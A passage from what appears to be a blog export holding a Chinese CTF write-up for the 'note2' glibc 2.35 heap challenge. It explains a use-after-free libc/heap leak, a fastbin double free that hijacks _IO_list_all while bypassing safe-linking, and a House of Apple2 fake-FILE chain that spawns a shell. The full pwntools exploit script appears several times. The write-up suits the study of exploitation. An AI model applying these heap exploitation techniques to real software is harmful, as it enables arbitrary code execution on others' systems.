import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='pwn'\nelf=ELF('./'+filename)\nlibc=ELF('libc.so.6')\n# p=process('./'+filename)\np=process('./pwn')\n#p=remote('',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \ndef add(idx,size,content):\n  ru('> ')\n  sl('1')\n  ru('Index?\\n')\n  sl(str(idx))\n  ru('Size?\\n')\n  sl(str(size))\n  ru('Enter content: ')\n  sl(content)\n\ndef free(idx):\n  ru('> ')\n  sl('2')\n  ru('Index?\\n')\n  sl(str(idx))\n\ndef view(idx):\n  ru('> ')\n  sl('3')\n  ru('Index?\\n')\n  sl(str(idx))\n\ndef exit_pwn():\n  ru('> ')\n  sl('4')\n\n# leak libc and heap base\nfor i in range(7):\n  add(str(i),0x110,b'\\x00'*0x8)\nadd(7,0x110,b'\\x00'*0x8)\nadd(8,0x110,'aaaaaaaa'*0x6)\nadd(9,0x70,'bbbbbbbb')\n\nfor i in range(1,7):\n  free(str(i))\nfree(8)\nfree(7)\n# 1-6 and 8 in tcache\n# 0 and 7 leak\n# unsorted head -> 0 -> 7\nview(7)\nlibcbase=uu64(ru('\\n')[2:-1])-0x219ce0\nfree(0)\n\nview(0)\nheapbase=uu64(ru('\\n')[2:-1])-0xa70\n\n# debug()\n\n# fast bin double free\nfree(9)\n\nfor i in range(10):\n  add(str(i),0x70,'f'*0x40)\nfor i in range(7):\n  free(str(i))\n# double free\nfree(7)\nfree(8)\nfree(7)\n\nfor i in range(7):\n  add(str(i),0x70,'g'*0x30)\n\nIO_list_addr=libcbase+libc.sym['_IO_list_all']\n# 7==9, write 9 by 7\npayload=p64(IO_list_addr^(heapbase>>12)) # bypass safe-linking (after glibc2.32)\nadd(7,0x70,payload)\nadd(8,0x70,'b'*0x40)\nadd(9,0x70,'c'*0x40)\n\n_IO_wfile_jumps=libcbase+libc.sym['_IO_wfile_jumps']\nsys_addr=libcbase+libc.sym['system']\none_gadget=libcbase+0xebcf8\n\n# construct fake io\ntarget_addr=heapbase+0xfc0\n\nfake_fp=b'  sh'\nfake_fp=fake_fp.ljust(0x28,b'\\x00')+p64(1)\nfake_fp=fake_fp.ljust(0xa0,b'\\x00')+p64(target_addr+0xe0) # ->wide_data\nfake_fp=fake_fp.ljust(0xd8,b'\\x00')+p64(_IO_wfile_jumps)\nfake_fp=fake_fp.ljust(0xe0+0xe0,b'\\x00')+p64(target_addr+0x210)\n\nfake_wide=b'\\x00'\nfake_wide=fake_wide.ljust(0x68,b'\\x00')+p64(sys_addr)\n\n\nadd(1,0x200,fake_fp) # +0xfc0\nadd(2,0x200,fake_wide) # +0x11c0\n\n# overwrite _IO_list_all\npayload=''\nadd(0,0x70,p64(heapbase+0xfc0))  \n\nleak('libcbase',hex(libcbase))\nleak('heapbase',hex(heapbase))\nleak('IO_list_addr',hex(IO_list_addr))\nleak('_IO_wfile_jumps',hex(_IO_wfile_jumps))\nleak('system',hex(sys_addr))\ndebug()\n\nexit_pwn()\n\nitr()\n\n```\n\n","source":"_posts/BaiLu-note2.md","raw":"---\n\ntitle: BaiLu_note2\ndate: 2023-03-08 19:28:27\ntags:\n- pwn\n- heap\n- 高版本glibc\n- House of xxx\ncategories:\n- pwn_wp\n---\n\n柏鹭杯的note2，用的glibc2.35。\n\n高版本的 glibc 封锁掉了很多的后门，特别是几个重要的 hook 不再是我们可以利用的了。这些高版本的glibc利用往往涉及到io(House of ...)，而且不少都与large bin有关系，但这里走的是fast bin和tcache。\n\n<!--more-->\n\n堆题经典保护全开。glibc2.35的ld文件用的是ld-linux-x86-64.so.2而不是ld-2.35.so\n\n```sh\npatchelf --set-interpreter /home/a1ph0nse/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so --set-rpath /home/a1ph0nse/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ filename\n\n# 高版本libc用ld-linux-x86-64.so.2，除此之外还要\nsudo cp -r /home/a1ph0nse/tools/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/.debug/.build-id/* /usr/lib/debug/.build-id/\n```\n\n这也是一个菜单，有增删查的功能；最多同时申请10个chunk，chunk的size<=0x200（small bin）；在删除的时候没有清空指针，存在UAF；查是简单的puts()；程序退出的时候走的是exit(0)。\n\n可以通过UAF+查leak libc，通过fast bin double free劫持_IO_list_all，之后走House of Apple2的利用链。\n\n### leak libc and heap base\n\n利用unsorted bin和UAF来leak libc\n\nheap base可以通过让两个chunk在unsorted bin中利用UAF来leak\n\nheap base也可以利用**glibc2.32引入tcache的safe-linking（异或加密）机制**来leak，该操作在chunk被放入tcache bin和从tcache bin中取出时进行，会对**存放在`fd`处的指针**进行处理。\n\n```c\n#define PROTECT_PTR(pos, ptr, type)  \\\n        ((type)((((size_t)pos) >> PAGE_SHIFT) ^ ((size_t)ptr)))\n#define REVEAL_PTR(pos, ptr, type)   \\\n        PROTECT_PTR(pos, ptr, type)\n```\n\n实际上就是执行`ptr^(heap_base>>12)`。因此第一个放入tcache的chunk中的fd=(0^(heap_base>>12))==(heap_base>>12)，因此只要读出其中的值，并左移12位即可得到heap_base。\n\n```py\nkey=uu64(r(5)) # heap_base长6字节,最后12位为0,右移12位后,接受5字节即可获得高36bit和额外的4bit\nheap_base=key<<12 # 此时左移12bit即可得到heap_base\n```\n\n### djack _IO_list_all\n\n这里要利用UAF控制unsorted bin或small bin并不容易，最方便的还是利用fast bin double free实现overlap，修改fd指向`_IO_list_all`，并且由于使用tcache，在tcache为空的情况下会先从fast bin放入tcache，再从tcache中取出，不会对`size`字段进行检查，因此不用调整偏移满足`size`字段。\n\n### House of Apple2\n\n伪造`IO_FILE`，利用House of Apple2，走`exit->fcloseall->_IO_cleanup->_IO_flush_all_lockp->_IO_wfile_overflow(_IO_wfile_jumps中的_IO_overflow)->_IO_wdoallocbuf->_IO_WDOALLOCATE->*(fp->_wide_data->_wide_vtable + 0x68)(fp)`\n\n```py\n# construct fake io\ntarget_addr=heapbase+0xfc0\n\nfake_fp=b'  sh' # flag <-target \nfake_fp=fake_fp.ljust(0x28,b'\\x00')+p64(1) # write_ptr > write_base\nfake_fp=fake_fp.ljust(0xa0,b'\\x00')+p64(target_addr+0xe0) # ->wide_data\nfake_fp=fake_fp.ljust(0xd8,b'\\x00')+p64(_IO_wfile_jumps) # mode<=0 ->vtable\nfake_fp=fake_fp.ljust(0xe0+0xe0,b'\\x00')+p64(target_addr+0x210) # ->wide_data->vtable\n\nfake_wide=b'\\x00'\nfake_wide=fake_wide.ljust(0x68,b'\\x00')+p64(sys_addr) # fp->_wide_data->_wide_vtable + 0x68=RIP\n\n\nadd(1,0x200,fake_fp) # +0xfc0\nadd(2,0x200,fake_wide) # +0x11c0\n```\n\n### exp\n\nexp:\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='pwn'\nelf=ELF('./'+filename)\nlibc=ELF('libc.so.6')\n# p=process('./'+filename)\np=process('./pwn')\n#p=remote('',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \ndef add(idx,size,content):\n  ru('> ')\n  sl('1')\n  ru('Index?\\n')\n  sl(str(idx))\n  ru('Size?\\n')\n  sl(str(size))\n  ru('Enter content: ')\n  sl(content)\n\ndef free(idx):\n  ru('> ')\n  sl('2')\n  ru('Index?\\n')\n  sl(str(idx))\n\ndef view(idx):\n  ru('> ')\n  sl('3')\n  ru('Index?\\n')\n  sl(str(idx))\n\ndef exit_pwn():\n  ru('> ')\n  sl('4')\n\n# leak libc and heap base\nfor i in range(7):\n  add(str(i),0x110,b'\\x00'*0x8)\nadd(7,0x110,b'\\x00'*0x8)\nadd(8,0x110,'aaaaaaaa'*0x6)\nadd(9,0x70,'bbbbbbbb')\n\nfor i in range(1,7):\n  free(str(i))\nfree(8)\nfree(7)\n# 1-6 and 8 in tcache\n# 0 and 7 leak\n# unsorted head -> 0 -> 7\nview(7)\nlibcbase=uu64(ru('\\n')[2:-1])-0x219ce0\nfree(0)\n\nview(0)\nheapbase=uu64(ru('\\n')[2:-1])-0xa70\n\n# debug()\n\n# fast bin double free\nfree(9)\n\nfor i in range(10):\n  add(str(i),0x70,'f'*0x40)\nfor i in range(7):\n  free(str(i))\n# double free\nfree(7)\nfree(8)\nfree(7)\n\nfor i in range(7):\n  add(str(i),0x70,'g'*0x30)\n\nIO_list_addr=libcbase+libc.sym['_IO_list_all']\n# 7==9, write 9 by 7\npayload=p64(IO_list_addr^(heapbase>>12)) # bypass safe-linking (after glibc2.32)\nadd(7,0x70,payload)\nadd(8,0x70,'b'*0x40)\nadd(9,0x70,'c'*0x40)\n\n_IO_wfile_jumps=libcbase+libc.sym['_IO_wfile_jumps']\nsys_addr=libcbase+libc.sym['system']\none_gadget=libcbase+0xebcf8\n\n# construct fake io\ntarget_addr=heapbase+0xfc0\n\nfake_fp=b'  sh'\nfake_fp=fake_fp.ljust(0x28,b'\\x00')+p64(1)\nfake_fp=fake_fp.ljust(0xa0,b'\\x00')+p64(target_addr+0xe0) # ->wide_data\nfake_fp=fake_fp.ljust(0xd8,b'\\x00')+p64(_IO_wfile_jumps)\nfake_fp=fake_fp.ljust(0xe0+0xe0,b'\\x00')+p64(target_addr+0x210)\n\nfake_wide=b'\\x00'\nfake_wide=fake_wide.ljust(0x68,b'\\x00')+p64(sys_addr)\n\n\nadd(1,0x200,fake_fp) # +0xfc0\nadd(2,0x200,fake_wide) # +0x11c0\n\n# overwrite _IO_list_all\npayload=''\nadd(0,0x70,p64(heapbase+0xfc0))  \n\nleak('libcbase',hex(libcbase))\nleak('heapbase',hex(heapbase))\nleak('IO_list_addr',hex(IO_list_addr))\nleak('_IO_wfile_jumps',hex(_IO_wfile_jumps))\nleak('system',hex(sys_addr))\ndebug()\n\nexit_pwn()\n\nitr()\n\n```\n\n","slug":"BaiLu-note2","published":1,"updated":"2023-03-17T14:53:06.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czaen00015oud0g881bvj","content":"<p>柏鹭杯的note2，用的glibc2.35。</p>\n<p>高版本的 glibc 封锁掉了很多的后门，特别是几个重要的 hook 不再是我们可以利用的了。这些高版本的glibc利用往往涉及到io(House of …)，而且不少都与large bin有关系，但这里走的是fast bin和tcache。</p>\n<span id=\"more\"></span>\n\n<p>堆题经典保护全开。glibc2.35的ld文件用的是ld-linux-x86-64.so.2而不是ld-2.35.so</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">patchelf --set-interpreter /home/a1ph0nse/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so --set-rpath /home/a1ph0nse/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ filename</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 高版本libc用ld-linux-x86-64.so.2，除此之外还要</span></span><br><span class=\"line\">sudo <span class=\"built_in\">cp</span> -r /home/a1ph0nse/tools/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/.debug/.build-id/* /usr/lib/debug/.build-id/</span><br></pre></td></tr></table></figure>\n\n<p>这也是一个菜单，有增删查的功能；最多同时申请10个chunk，chunk的size&lt;=0x200（small bin）；在删除的时候没有清空指针，存在UAF；查是简单的puts()；程序退出的时候走的是exit(0)。</p>\n<p>可以通过UAF+查leak libc，通过fast bin double free劫持_IO_list_all，之后走House of Apple2的利用链。</p>\n<h3 id=\"leak-libc-and-heap-base\"><a href=\"#leak-libc-and-heap-base\" class=\"headerlink\" title=\"leak libc and heap base\"></a>leak libc and heap base</h3><p>利用unsorted bin和UAF来leak libc</p>\n<p>heap base可以通过让两个chunk在unsorted bin中利用UAF来leak</p>\n<p>heap base也可以利用<strong>glibc2.32引入tcache的safe-linking（异或加密）机制</strong>来leak，该操作在chunk被放入tcache bin和从tcache bin中取出时进行，会对<strong>存放在<code>fd</code>处的指针</strong>进行处理。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PROTECT_PTR(pos, ptr, type)  \\</span></span><br><span class=\"line\"><span class=\"meta\">        ((type)((((size_t)pos) &gt;&gt; PAGE_SHIFT) ^ ((size_t)ptr)))</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> REVEAL_PTR(pos, ptr, type)   \\</span></span><br><span class=\"line\"><span class=\"meta\">        PROTECT_PTR(pos, ptr, type)</span></span><br></pre></td></tr></table></figure>\n\n<p>实际上就是执行<code>ptr^(heap_base&gt;&gt;12)</code>。因此第一个放入tcache的chunk中的fd=(0^(heap_base&gt;&gt;12))==(heap_base&gt;&gt;12)，因此只要读出其中的值，并左移12位即可得到heap_base。</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">key=uu64(r(<span class=\"number\">5</span>)) <span class=\"comment\"># heap_base长6字节,最后12位为0,右移12位后,接受5字节即可获得高36bit和额外的4bit</span></span><br><span class=\"line\">heap_base=key&lt;&lt;<span class=\"number\">12</span> <span class=\"comment\"># 此时左移12bit即可得到heap_base</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"djack-IO-list-all\"><a href=\"#djack-IO-list-all\" class=\"headerlink\" title=\"djack _IO_list_all\"></a>djack _IO_list_all</h3><p>这里要利用UAF控制unsorted bin或small bin并不容易，最方便的还是利用fast bin double free实现overlap，修改fd指向<code>_IO_list_all</code>，并且由于使用tcache，在tcache为空的情况下会先从fast bin放入tcache，再从tcache中取出，不会对<code>size</code>字段进行检查，因此不用调整偏移满足<code>size</code>字段。</p>\n<h3 id=\"House-of-Apple2\"><a href=\"#House-of-Apple2\" class=\"headerlink\" title=\"House of Apple2\"></a>House of Apple2</h3><p>伪造<code>IO_FILE</code>，利用House of Apple2，走<code>exit-&gt;fcloseall-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp-&gt;_IO_wfile_overflow(_IO_wfile_jumps中的_IO_overflow)-&gt;_IO_wdoallocbuf-&gt;_IO_WDOALLOCATE-&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</code></p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># construct fake io</span></span><br><span class=\"line\">target_addr=heapbase+<span class=\"number\">0xfc0</span></span><br><span class=\"line\"></span><br><span class=\"line\">fake_fp=<span class=\"string\">b&#x27;  sh&#x27;</span> <span class=\"comment\"># flag &lt;-target </span></span><br><span class=\"line\">fake_fp=fake_fp.ljust(<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(<span class=\"number\">1</span>) <span class=\"comment\"># write_ptr &gt; write_base</span></span><br><span class=\"line\">fake_fp=fake_fp.ljust(<span class=\"number\">0xa0</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(target_addr+<span class=\"number\">0xe0</span>) <span class=\"comment\"># -&gt;wide_data</span></span><br><span class=\"line\">fake_fp=fake_fp.ljust(<span class=\"number\">0xd8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(_IO_wfile_jumps) <span class=\"comment\"># mode&lt;=0 -&gt;vtable</span></span><br><span class=\"line\">fake_fp=fake_fp.ljust(<span class=\"number\">0xe0</span>+<span class=\"number\">0xe0</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(target_addr+<span class=\"number\">0x210</span>) <span class=\"comment\"># -&gt;wide_data-&gt;vtable</span></span><br><span class=\"line\"></span><br><span class=\"line\">fake_wide=<span class=\"string\">b&#x27;\\x00&#x27;</span></span><br><span class=\"line\">fake_wide=fake_wide.ljust(<span class=\"number\">0x68</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(sys_addr) <span class=\"comment\"># fp-&gt;_wide_data-&gt;_wide_vtable + 0x68=RIP</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x200</span>,fake_fp) <span class=\"comment\"># +0xfc0</span></span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">0x200</span>,fake_wide) <span class=\"comment\"># +0x11c0</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><p>exp:</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;libc.so.6&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">idx,size,content</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Index?\\n&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Size?\\n&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Enter content: &#x27;</span>)</span><br><span class=\"line\">  sl(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Index?\\n&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">view</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Index?\\n&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exit_pwn</span>():</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak libc and heap base</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">  add(<span class=\"built_in\">str</span>(i),<span class=\"number\">0x110</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0x8</span>)</span><br><span class=\"line\">add(<span class=\"number\">7</span>,<span class=\"number\">0x110</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0x8</span>)</span><br><span class=\"line\">add(<span class=\"number\">8</span>,<span class=\"number\">0x110</span>,<span class=\"string\">&#x27;aaaaaaaa&#x27;</span>*<span class=\"number\">0x6</span>)</span><br><span class=\"line\">add(<span class=\"number\">9</span>,<span class=\"number\">0x70</span>,<span class=\"string\">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">7</span>):</span><br><span class=\"line\">  free(<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\">free(<span class=\"number\">8</span>)</span><br><span class=\"line\">free(<span class=\"number\">7</span>)</span><br><span class=\"line\"><span class=\"comment\"># 1-6 and 8 in tcache</span></span><br><span class=\"line\"><span class=\"comment\"># 0 and 7 leak</span></span><br><span class=\"line\"><span class=\"comment\"># unsorted head -&gt; 0 -&gt; 7</span></span><br><span class=\"line\">view(<span class=\"number\">7</span>)</span><br><span class=\"line\">libcbase=uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[<span class=\"number\">2</span>:-<span class=\"number\">1</span>])-<span class=\"number\">0x219ce0</span></span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">view(<span class=\"number\">0</span>)</span><br><span class=\"line\">heapbase=uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[<span class=\"number\">2</span>:-<span class=\"number\">1</span>])-<span class=\"number\">0xa70</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># fast bin double free</span></span><br><span class=\"line\">free(<span class=\"number\">9</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):</span><br><span class=\"line\">  add(<span class=\"built_in\">str</span>(i),<span class=\"number\">0x70</span>,<span class=\"string\">&#x27;f&#x27;</span>*<span class=\"number\">0x40</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">  free(<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"><span class=\"comment\"># double free</span></span><br><span class=\"line\">free(<span class=\"number\">7</span>)</span><br><span class=\"line\">free(<span class=\"number\">8</span>)</span><br><span class=\"line\">free(<span class=\"number\">7</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">  add(<span class=\"built_in\">str</span>(i),<span class=\"number\">0x70</span>,<span class=\"string\">&#x27;g&#x27;</span>*<span class=\"number\">0x30</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">IO_list_addr=libcbase+libc.sym[<span class=\"string\">&#x27;_IO_list_all&#x27;</span>]</span><br><span 